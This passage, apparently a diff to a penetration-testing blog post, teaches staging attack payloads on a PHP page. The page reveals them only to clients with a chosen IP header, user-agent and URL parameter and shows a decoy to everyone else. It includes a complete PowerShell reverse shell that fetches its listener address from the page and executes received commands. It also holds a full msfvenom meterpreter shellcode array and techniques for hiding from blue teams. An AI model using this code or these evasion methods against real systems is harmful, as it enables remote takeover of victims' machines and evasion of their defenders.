@@ -482,3 +482,713 @@ Keep in mind that not only was there a series of DNS lookups to retrieve our scr
 ### Wrapping Up
 
 In this post we worked through the process of spinning up a DNS server on Kali Linux and learned how we can use TXT records to stage payloads that we can retrieve through DNS lookups. While these methods were relatively straight forward, you can build upon these techniques, adding complexity and obscurity to make it something of your own. Keep your eyes open for an upcoming post, as we'll continue this discussion, except we'll take advantage of PHP to deliver these same payloads with an added twist.
+
+## PHP Web Pages
+
+* Serving PHP Code
+* Conditional Access
+* Staged Listener Address
+* Staged Shellcode
+* Staged Script
+
+One of the more commonly utilized services on Kali Linux is the Apache HTTP Server. One workflow you'll typically find penetration testers use this service for is to host different types of files they can pull down when needed, such as scripts and binaries. While this is still an effective workflow, these files are often left exposed and if discovered by a blue team they could be easily obtained and reverse engineered to your disadvantage. 
+
+To help mitigate the likelihood of this happening, we'll take advantage of the interoperability with Apache/PHP on our Kali Linux system. This will allow us to build a web page that can host our payloads that are hidden behind a set of conditions that must be met in order to retrieve them. 
+
+### Serving PHP Code
+ 
+The process to have a functioning PHP page hosted on Kali Linux is a trivial process as the PHP [packages](https://www.kali.org/tools/php-defaults/) are already installed. We will start things off with a basic proof of concept by creating the file `/etc/var/www/html/payload.php` with the following content:
+
+![](./Screenshots/php-1.png)
+
+With our file created, our next step is to see if Apache is running our system. 
+
+![](./Screenshots/php-2.png)
+
+We can see here that Apache is inactive, so we'll start the service and run the command again to verify that it's now up and running.
+
+![](./Screenshots/php-3.png)
+
+Now that we have started up our service, our next step is to verify that our web server is properly executing PHP code. To facilitate this test we'll use the _curl_ command from our terminal.
+
+![](./Screenshots/php-4.png)
+
+Everything appears to be working properly and as you can see, it was a very simple process. It's important for us to note that when we attempt to view the source code for this page from a browser, we will only see the text `Hello, there.` in lieu of the entire code from our PHP file.
+
+![](./Screenshots/php-5.png)
+
+This is important to keep in mind because PHP is a server-side programming language. This means that our PHP code is executed on the server which then presents the generated content to the requesting client. This allows us to keep our delivery logic, and other payloads we have embedded in the PHP file hidden from unintended view. Now we'll move into introducing targeted logic in our PHP code.
+
+### Conditional Access
+
+When we stage our payloads we want them to be accessible when we want to retrieve them from our download cradles, however, we don't want them visible to just anyone that happens to discover our web server and decides to poke around. To add a level of obscurity, we will introduce conditions that must be met in order to retrieve our payloads. 
+
+In particular we will illustrate three different techniques that you can implement to control when your payload is to be made visible. Each of these techniques leverage information that's normally transmitted between a web client and web server during a simple _GET_ request.
+
+The first method we'll introduce is restricting access to our payload based on the IP address of the web client that our web page is able to extract from the _GET_ request. Lets take a look at how to accomplish this. Our code consists of a function called _callerIp_ that takes in a single parameter called _$caller_ which we'll use to pass the value of the IP address that we want to find. 
+
+Our function then looks to see if an IP address has been stored in one of three values within the global variable _$_SERVER_, which is automatically set when a client communicates with our page. The first two values, _HTTP_CLIENT_IP_ and _HTTP_X_FORWARDED_FOR_ are spoofable headers that are typically set when the request comes from a proxy server, which we are including here intentionally. The third value, _REMOTE_ADDR_ is the address retrieved during the TCP handshake between the client and server. 
+
+If the IP address we pass into the function matches the address found in any of the three values within the _$_SERVER_ global variable, then the function will return TRUE. 
+
+```php
+function callerIp($caller) {
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+
+    if (filter_var($client, FILTER_VALIDATE_IP)) {
+        $ip = $client;
+    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
+        $ip = $forward;
+    } else {
+        $ip = $remote;
+    }
+
+    if ($caller === $ip) {
+        return TRUE;
+    } else {
+        return FALSE;
+    }
+}
+```
+
+We will call this function and store the output in a variable called _$ip_. We will then use an _if statement_ to check the value of this variable. If the statement resolves to TRUE, then our page will present our hidden content. 
+
+```php
+$ip = callerIp('192.168.0.26');
+
+if ($ip) {
+    echo "I see you.";
+}
+```
+
+Keep in mind that the IP address doesn't necessarily need to be legit, we just want to be able to retrieve any IP address that can discovered in the headers provided previously. If we don't pass a spoofed IP address in the first two headers, then it'll simply retrieve the IP address of the client that interacted with the server. 
+
+We'll save our complete code into our `payload.php` file. 
+
+```php
+<?php
+function callerIp($caller) {
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+
+    if (filter_var($client, FILTER_VALIDATE_IP)) {
+        $ip = $client;
+    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
+        $ip = $forward;
+    } else {
+        $ip = $remote;
+    }
+
+    if ($caller === $ip) {
+        return TRUE;
+    } else {
+        return FALSE;
+    }
+}
+
+$ip = callerIp('192.168.0.26');
+
+if ($ip) {
+    echo "I see you.";
+}
+?>
+```
+
+Next we will use _curl_ again to interact with our PHP page to see what message we get in return.
+
+![](./Screenshots/php-6.png)
+
+In this case the server sees our IP address as the loopback address due to the URL we are using, so we will not see our hidden message. We'll circumvent this by re-using _curl_ again except we'll spoof the `x-forwarded-for` header to ensure that we pass the required condition.
+
+![](./Screenshots/php-7.png)
+
+With this slight modification to our web call, we can now retrieve our hidden payload. 
+
+The next technique we'll introduce will be around the user-agent, which is also stored in the _$_Server_ global variable. The user-agent is a string that contains information about the agent or client that is interacting with a web page, such as your browser version. 
+
+Let's look at a basic demonstration on the types of user-agents that can be seen with the following example.
+
+```php
+<?php
+$agent = $_SERVER['HTTP_USER_AGENT'];
+echo "You're using $agent";
+?>
+```
+
+In this example, we'll retrieve the value of the user-agent and store it within a variable that will be then written back to the requesting client. We will save this code to our `payload.php` file and interact with our web page using  _curl_, _wget_ and _Firefox_. 
+
+The first two terminal commands produce different user-agents as expected.
+
+![](./Screenshots/php-8.png)
+
+We also see a different user-agent when we browse to our page using FireFox. 
+
+![](./Screenshots/php-9.png)
+
+The idea here is to understand that there are many different types of [user-agents](https://developers.whatismybrowser.com/useragents/explore/) circulating around the internet. While this value is automatically sent by a client, we can also manipulate this value to any value we desire. 
+
+With a better understanding of user-agents, let's see how we can control access to our page using the user-agent. Our new code consists of a function called _callerAgent_ that takes in a single parameter called _$caller_ which we'll use to pass the value of the user-agent that we want to find. The function then looks to see if the user-agent supplied by the client matches the one we supplied to our function. If they match, the function will return TRUE. 
+
+```php
+function callerAgent($caller) {
+    $agent = $_SERVER['HTTP_USER_AGENT'];
+    if ($caller === $agent) {
+        return TRUE;
+    } else {
+        return FALSE;
+    }
+}
+```
+
+We will call this function and store the output in a variable called _$agent_. We will then use an _if statement_ to check the value of this variable. If the statement resolves to TRUE, then our page will present our hidden content. 
+
+```php
+$agent = callerAgent('Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0');
+
+if ($agent) {
+    echo "I see you.";
+}
+```
+
+We'll save our complete code into our `payload.php` file. 
+
+```php
+<?php
+function callerAgent($caller) {
+    $agent = $_SERVER['HTTP_USER_AGENT'];
+    if ($caller === $agent) {
+        return TRUE;
+    } else {
+        return FALSE;
+    }
+}
+
+$agent = callerAgent('Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0');
+
+if ($agent) {
+    echo "I see you.";
+}
+?>
+```
+
+Now we will repeat the same actions taken earlier when discovering the different types of user-agents. We will immediately notice that our terminal commands do not produce any output.
+
+![](./Screenshots/php-10.png)
+
+Whereas our browser receives our hidden message as the user-agent sent by the browser matches the specific value we're looking for.
+
+![](./Screenshots/php-11.png)
+
+Now we'll change our approach slightly from our victim machine using a PowerShell script, leveraging the `WebClient` class from the `System.Net` namespace. Once we instantiate our object, we'll add a hardcoded user-agent to replicate that of our FireFox browser, then we'll communicate with our PHP page using the _DownloadString_ method. Using this method to spoof the user-agent from a PowerShell script, we have revealed our hidden content.
+
+```powershell
+PS C:\> $WC = New-Object System.Net.WebClient
+PS C:\> $WC.Headers.Add('user-agent','Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0')
+PS C:\> $WC.DownloadString('http://192.168.0.21/payload.php')
+I see you.
+```
+
+The final technique we'll introduce involves checking whether or not a parameter was supplied by the client when interacting with our PHP page, which can be done through the URL. Our code consists of a function called _callerParam_ that takes in a single parameter called _$caller_ which we'll use to pass the name of a parameter that we want to find. The function will then look to see if the client has included that parameter by checking if the PHP global variable _$_GET_ contains that parameter through the _isset_ function. If the parameter has been found, regardless of any supplied value assigned to that parameter, including nothing, then the function will return TRUE.
+
+```php
+function callerParam($caller) {
+    $param = isset($_GET[$caller]);
+    if ($param) {
+        return TRUE;
+    } else {
+        return FALSE;
+    }
+}
+```
+
+We will call this function and store the output in a variable called _$param_. We will then use an _if statement_ to check the value of this variable. If the statement resolves to TRUE, then our page will present our hidden content. 
+
+```PHP
+$param = callerParam('callback');
+
+if ($param) {
+    echo "I see you.";
+}
+```
+
+Now we'll save our complete code into our `payload.php` file. 
+
+```php
+<?php
+function callerParam($caller) {
+    $param = isset($_GET[$caller]);
+    if ($param) {
+        return TRUE;
+    } else {
+        return FALSE;
+    }
+}
+
+$param = callerParam('callback');
+
+if ($param) {
+    echo "I see you.";
+}
+?>
+```
+
+With our complete code staged, we'll use _curl_ to interact with our page. 
+
+![](./Screenshots/php-12.png)
+
+As expected, we see nothing, but if we include the parameter _callback_ in our request, we see our hidden message. 
+
+![](./Screenshots/php-13.png)
+
+While using these techniques on their own can work, we can make it much harder for prying eyes by combining these solutions into one, or any combination thereof. In this scenario, we're going to use all three conditions, except we're going to add another twist. 
+
+We are going to change the value of our expected user-agent slightly to look relatively unique at a quick glance, but is unique enough where only its explicit use will receive a dedicated payload. In this case we'll add an extra `0` at the end of the Mozilla/FireFox version numbers. If this value was to be viewed in a web log, it wouldn't be overly obvious that it was fake. The next condition we'll change for some additional obscurity will be requiring a random IP address in our `Client-IP` header. You may be able to buy yourself some time if you use a valid IP address of another machine simply to cause a level of confusion or curiosity as a distraction. 
+
+We'll save our complete code into our `payload.php` file.
+
+```php
+<?php
+function callerIp($caller) {
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+
+    if (filter_var($client, FILTER_VALIDATE_IP)) {
+        $ip = $client;
+    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
+        $ip = $forward;
+    } else {
+        $ip = $remote;
+    }
+
+    if ($caller === $ip) {
+        return TRUE;
+    } else {
+        return FALSE;
+    }
+}
+
+function callerAgent($caller) {
+    $agent = $_SERVER['HTTP_USER_AGENT'];
+    if ($caller === $agent) {
+        return TRUE;
+    } else {
+        return FALSE;
+    }
+}
+
+function callerParam($caller) {
+    $param = isset($_GET[$caller]);
+    if ($param) {
+        return TRUE;
+    } else {
+        return FALSE;
+    }
+}
+
+$ip = callerIp('192.168.0.29');
+$agent = callerAgent('Mozilla/5.0 (X11; Linux x86_64; rv:102.00) Gecko/20100101 Firefox/102.00');
+$param = callerParam('session');
+
+if ($ip && $agent && $param) {
+    echo "I see you.";
+}
+?>
+```
+
+We'll save our updated code and connect to our web page from our intended victim machine, except this time we'll be using the PowerShell cmdlet `Invoke-WebRequest` with our spoofed `user-agent` and `client-ip` header. 
+
+```powershell
+PS C:\> (Invoke-WebRequest http://192.168.0.21/payload.php?session -Headers @{'Client-IP' = '192.168.0.29'} -UserAgent 'Mozilla/5.0 (X11; Linux x86_64; rv:102.00) Gecko/20100101 Firefox/102.00').Content
+I see you.
+```
+
+If we browse to the web page from the same machine using the browser, it will not display our hidden message
+
+![](./Screenshots/php-14.png)
+
+Now we have a solid set of conditions that must be met to retrieve our staged payloads. Keep in mind that when the conditions are not met, the client will receive a blank page. While this isn't much of a big deal for simple CTFs or smaller internal engagements, you'll likely run into issues if you host this over the internet. 
+
+This is largely because if your page has no content and gets scanned by a security provider, it'll be tagged as an uncategorized website, which is typically blocked by organizations to protect against attackers spinning up malicious sites AD-HOC. You can circumvent this if you create some sites with very basic themes that are vivid enough to get categorized.
+
+For the time being, we'll use a simple proof of concept to demonstrate the use of decoy content. For this decoy, we'll include a new function called _decoy_ that will print a message that has been base64 encoded. Our function also checks if the user-agent is a common terminal client. If it isn't, then it'll add a HTML tag to handle some formatting requirements. 
+
+```PHP
+<?php
+function decoy() {
+    $decoy = 'Li4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uDQouLi4uLi4uIyMuLi4uLiMjLi4uLi4jIy4uLi4uLi4uLi4uLi4NCi4uLi4uLi4uLiMjLi4uLi4jIy4uLi4uIyMuLi4uLi4uLi4uLg0KLi4uLi4uLiMjLi4uLi4jIy4uLi4jIy4uLi4uLi4uLi4uLi4uDQouLi4uLi4uIyMuLi4uLiMjLi4uLiMjLi4uLi4uLi4uLi4uLi4NCi4uLi4uLi4uLiMjLi4uLi4jIy4uLiMjLi4uLi4uLi4uLi4uLg0KLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uDQouLi4uLi4jIyMjIyMjIyMjIyMjIyMjIyMjIy4uLi4uLi4uLi4NCi4uLi4uLiMjLi4uLi4uLi4uLi4uLi4uLiMjIyMjIy4uLi4uLg0KLi4uLi4uIyMuLi5UcnkuSGFyZGVyLi4uIyMuLiMjLi4uLi4uDQouLi4uLi4jIy4uLi4uLi4uLi4uLi4uLi4jIy4uIyMuLi4uLi4NCi4uLi4uLiMjLi4uLi4uLi4uLi4uLi4uLiMjIyMjIy4uLi4uLg0KLi4uLi4uLi4jIy4uLi4uLi4uLi4uLiMjLi4uLi4uLi4uLi4uDQouLi4uIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjLi4uLi4uLi4NCi4uLi4jIy4uLi4uLi4uLi4uLi4uLi4uLi4uIyMuLi4uLi4uLg0KLi4uLi4uIyMjIyMjIyMjIyMjIyMjIyMjIyMuLi4uLi4uLi4uDQouLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4=';
+    $agent = $_SERVER['HTTP_USER_AGENT'];
+
+    if(preg_match('((?i)(curl|wget|powershell))', $agent) === 1) {
+        echo base64_decode($decoy);
+    } else {
+        echo '<pre>' . base64_decode($decoy) . '</pre>';
+    }
+}
+?>
+```
+
+We'll save our complete code into our `payload.php` file.
+
+```php
+<?php
+function callerIp($caller) {
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+
+    if (filter_var($client, FILTER_VALIDATE_IP)) {
+        $ip = $client;
+    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
+        $ip = $forward;
+    } else {
+        $ip = $remote;
+    }
+
+    if ($caller === $ip) {
+        return TRUE;
+    } else {
+        return FALSE;
+    }
+}
+
+function callerAgent($caller) {
+    $agent = $_SERVER['HTTP_USER_AGENT'];
+    if ($caller === $agent) {
+        return TRUE;
+    } else {
+        return FALSE;
+    }
+}
+
+function callerParam($caller) {
+    $param = isset($_GET[$caller]);
+    if ($param) {
+        return TRUE;
+    } else {
+        return FALSE;
+    }
+}
+
+function decoy() {
+    $decoy = 'Li4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uDQouLi4uLi4uIyMuLi4uLiMjLi4uLi4jIy4uLi4uLi4uLi4uLi4NCi4uLi4uLi4uLiMjLi4uLi4jIy4uLi4uIyMuLi4uLi4uLi4uLg0KLi4uLi4uLiMjLi4uLi4jIy4uLi4jIy4uLi4uLi4uLi4uLi4uDQouLi4uLi4uIyMuLi4uLiMjLi4uLiMjLi4uLi4uLi4uLi4uLi4NCi4uLi4uLi4uLiMjLi4uLi4jIy4uLiMjLi4uLi4uLi4uLi4uLg0KLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uDQouLi4uLi4jIyMjIyMjIyMjIyMjIyMjIyMjIy4uLi4uLi4uLi4NCi4uLi4uLiMjLi4uLi4uLi4uLi4uLi4uLiMjIyMjIy4uLi4uLg0KLi4uLi4uIyMuLi5UcnkuSGFyZGVyLi4uIyMuLiMjLi4uLi4uDQouLi4uLi4jIy4uLi4uLi4uLi4uLi4uLi4jIy4uIyMuLi4uLi4NCi4uLi4uLiMjLi4uLi4uLi4uLi4uLi4uLiMjIyMjIy4uLi4uLg0KLi4uLi4uLi4jIy4uLi4uLi4uLi4uLiMjLi4uLi4uLi4uLi4uDQouLi4uIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjLi4uLi4uLi4NCi4uLi4jIy4uLi4uLi4uLi4uLi4uLi4uLi4uIyMuLi4uLi4uLg0KLi4uLi4uIyMjIyMjIyMjIyMjIyMjIyMjIyMuLi4uLi4uLi4uDQouLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4=';
+    $agent = $_SERVER['HTTP_USER_AGENT'];
+
+    if(preg_match('((?i)(curl|wget|powershell))', $agent) === 1) {
+        echo base64_decode($decoy);
+    } else {
+        echo '<pre>' . base64_decode($decoy) . '</pre>';
+    }
+}
+
+$ip = callerIp('192.168.0.29');
+$agent = callerAgent('Mozilla/5.0 (X11; Linux x86_64; rv:102.00) Gecko/20100101 Firefox/102.00');
+$param = callerParam('session');
+
+if ($ip && $agent && $param) {
+    echo "I see you.";
+} else {
+    decoy();
+}
+?>
+```
+
+Now we will attempt to browse to our page again using the same browser on our victim machine, which has revealed our decoy content.
+
+![](./Screenshots/php-15.png)
+
+With our conditional access requirements in place, we'll jump into how to stage the same payloads we had used previously in our DNS topic. With fresh coffee in hand, let's get to it.  
+
+### Staged Listener Address
+
+The first payload we will look at will be our listener address. As a recap, we are going to store the listener details of our attacker machine in an `IP,PORT` format within our web page. We will use a web call from our reverse shell payload to retrieve and format this payload so that we can inject it into our payload to achieve a successful reverse shell.
+
+In order to achieve this, we'll make a few small modifications to our existing `payloads.php` file. Our updated code will consist of a new function called _payload_ that will simply print the contents of our payload that we have stored in a variable. 
+
+```php
+function payload() {
+    $payload = '192.168.0.21,443';
+    echo $payload;
+}
+```
+
+With our payload staged, we'll now address the conditions that must be met in order for our caller to retrieve them. In this scenario, we're going to require our web page to retrieve the ip address of `192.168.0.29`, the user-agent of `'Mozilla/5.0 (X11; Linux x86_64; rv:102.00) Gecko/20100101 Firefox/102.00` and the parameter name `session`.
+
+```php
+$ip = callerIp('192.168.0.29');
+$agent = callerAgent('Mozilla/5.0 (X11; Linux x86_64; rv:102.00) Gecko/20100101 Firefox/102.00');
+$param = callerParam('session');
+
+if ($ip && $agent && $param) {
+    payload();
+} else {
+    decoy();
+}
+```
+
+We'll save our code into our `payload.php` file.
+
+```php
+<?php
+function callerIp($caller) {
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+
+    if (filter_var($client, FILTER_VALIDATE_IP)) {
+        $ip = $client;
+    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
+        $ip = $forward;
+    } else {
+        $ip = $remote;
+    }
+
+    if ($caller === $ip) {
+        return TRUE;
+    } else {
+        return FALSE;
+    }
+}
+
+function callerAgent($caller) {
+    $agent = $_SERVER['HTTP_USER_AGENT'];
+    if ($caller === $agent) {
+        return TRUE;
+    } else {
+        return FALSE;
+    }
+}
+
+function callerParam($caller) {
+    $param = isset($_GET[$caller]);
+    if ($param) {
+        return TRUE;
+    } else {
+        return FALSE;
+    }
+}
+
+function decoy() {
+    $decoy = 'Li4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uDQouLi4uLi4uIyMuLi4uLiMjLi4uLi4jIy4uLi4uLi4uLi4uLi4NCi4uLi4uLi4uLiMjLi4uLi4jIy4uLi4uIyMuLi4uLi4uLi4uLg0KLi4uLi4uLiMjLi4uLi4jIy4uLi4jIy4uLi4uLi4uLi4uLi4uDQouLi4uLi4uIyMuLi4uLiMjLi4uLiMjLi4uLi4uLi4uLi4uLi4NCi4uLi4uLi4uLiMjLi4uLi4jIy4uLiMjLi4uLi4uLi4uLi4uLg0KLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uDQouLi4uLi4jIyMjIyMjIyMjIyMjIyMjIyMjIy4uLi4uLi4uLi4NCi4uLi4uLiMjLi4uLi4uLi4uLi4uLi4uLiMjIyMjIy4uLi4uLg0KLi4uLi4uIyMuLi5UcnkuSGFyZGVyLi4uIyMuLiMjLi4uLi4uDQouLi4uLi4jIy4uLi4uLi4uLi4uLi4uLi4jIy4uIyMuLi4uLi4NCi4uLi4uLiMjLi4uLi4uLi4uLi4uLi4uLiMjIyMjIy4uLi4uLg0KLi4uLi4uLi4jIy4uLi4uLi4uLi4uLiMjLi4uLi4uLi4uLi4uDQouLi4uIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjLi4uLi4uLi4NCi4uLi4jIy4uLi4uLi4uLi4uLi4uLi4uLi4uIyMuLi4uLi4uLg0KLi4uLi4uIyMjIyMjIyMjIyMjIyMjIyMjIyMuLi4uLi4uLi4uDQouLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4=';
+    $agent = $_SERVER['HTTP_USER_AGENT'];
+    if(preg_match('((?i)(curl|wget|powershell))', $agent) === 1) {
+        echo base64_decode($decoy);
+    } else {
+        echo '<pre>' . base64_decode($decoy) . '</pre>';
+    }
+}
+
+function payload() {
+    $payload = '192.168.0.21,443';
+    echo $payload;
+}
+
+$ip = callerIp('192.168.0.29');
+$agent = callerAgent('Mozilla/5.0 (X11; Linux x86_64; rv:102.00) Gecko/20100101 Firefox/102.00');
+$param = callerParam('session');
+
+if ($ip && $agent && $param) {
+    payload();
+} else {
+    decoy();
+}
+
+?>
+```
+
+With our `payload.php` staged and ready to go, we'll look at how to retrieve this payload and inject our listener details into our PowerShell reverse shell. Because of the format of our listener detailers, we need to split the string and designate the appropriate index for our intended ip and port.
+
+```powershell
+PS C:\> $HTTP = (Invoke-WebRequest http://192.168.0.21/payload.php?session -Headers @{'Client-IP' = '192.168.0.29'} -UserAgent 'Mozilla/5.0 (X11; Linux x86_64; rv:102.00) Gecko/20100101 Firefox/102.00').Content
+PS C:\> $HTTP.Split(',')[0],$HTTP.Split(',')[1]
+192.168.0.21
+443
+```
+
+Next we'll add this download cradle into our reverse shell script and run it from our victim machine.
+
+```powershell
+$HTTP = (Invoke-WebRequest http://192.168.0.21/payload.php?session -Headers @{'Client-IP' = '192.168.0.29'} -UserAgent 'Mozilla/5.0 (X11; Linux x86_64; rv:102.00) Gecko/20100101 Firefox/102.00').Content
+$client = New-Object System.Net.Sockets.TCPClient($HTTP.split(',')[0],$HTTP.split(',')[1]);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+}
+$client.Close()
+```
+
+We can see the interaction with our PHP page as well as a successful reverse shell.
+
+![](./Screenshots/php-16.png)
+
+This was a very simple scenario, but has worked out quite nicely.
+
+### Staged Shellcode
+
+The second payload we will look at will be our shellcode runner. As a recap, we are going to store shellcode that we'll generate with _msfvenom_ that will be executed through the use of various Windows APIs. We will use a web call from our shellcode runner to retrieve and format this payload so that we can inject it into our payload to achieve a successful meterpreter reverse shell.
+
+Similar to before, our shellcode runner will include a download cradle that will retrieve our staged payload from our PHP page, except in this instance we'll be pulling down shellcode. We'll start with generating our shellcode using _msfvendon_.
+
+
+```
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.21 LPORT=443 EXITFUNC=thread -f ps1
+```
+
+With our shellcode in hand, we'll copy and paste it into our _payload_ function. We do not need to do any additional formatting so this part is straight forward.
+
+```php
+function payload() {
+    $payload = '0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x8b,0x48,0x18,0x50,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x4d,0x31,0xc9,0x48,0x1,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x7,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xd,0x0,0x0,0x0,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x30,0x2e,0x32,0x31,0x0,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x1,0x0,0x0,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0x1f,0x0,0x0,0x0,0x2f,0x57,0x30,0x37,0x34,0x69,0x4e,0x45,0x31,0x70,0x48,0x56,0x69,0x75,0x57,0x4f,0x37,0x41,0x62,0x63,0x6e,0x34,0x51,0x75,0x77,0x69,0x34,0x52,0x49,0x57,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x0,0x32,0xa8,0x84,0x0,0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x0,0x0,0x49,0xba,0x44,0xf0,0x35,0xe0,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0xff,0xcf,0x74,0x2,0xeb,0xaa,0xe8,0x55,0x0,0x0,0x0,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0xbb,0xe0,0x1d,0x2a,0xa,0x41,0x89,0xda,0xff,0xd5';
+    echo $payload;
+}
+```
+
+Now we'll change the conditions to require the same IP address and user-agent, but we'll change the parameter name to something different. 
+
+```php
+$ip = callerIp('192.168.0.29');
+$agent = callerAgent('Mozilla/5.0 (X11; Linux x86_64; rv:102.00) Gecko/20100101 Firefox/102.00');
+$param = callerParam('handler');
+
+if ($ip && $agent && $param) {
+    payload();
+} else {
+    decoy();
+}
+```
+
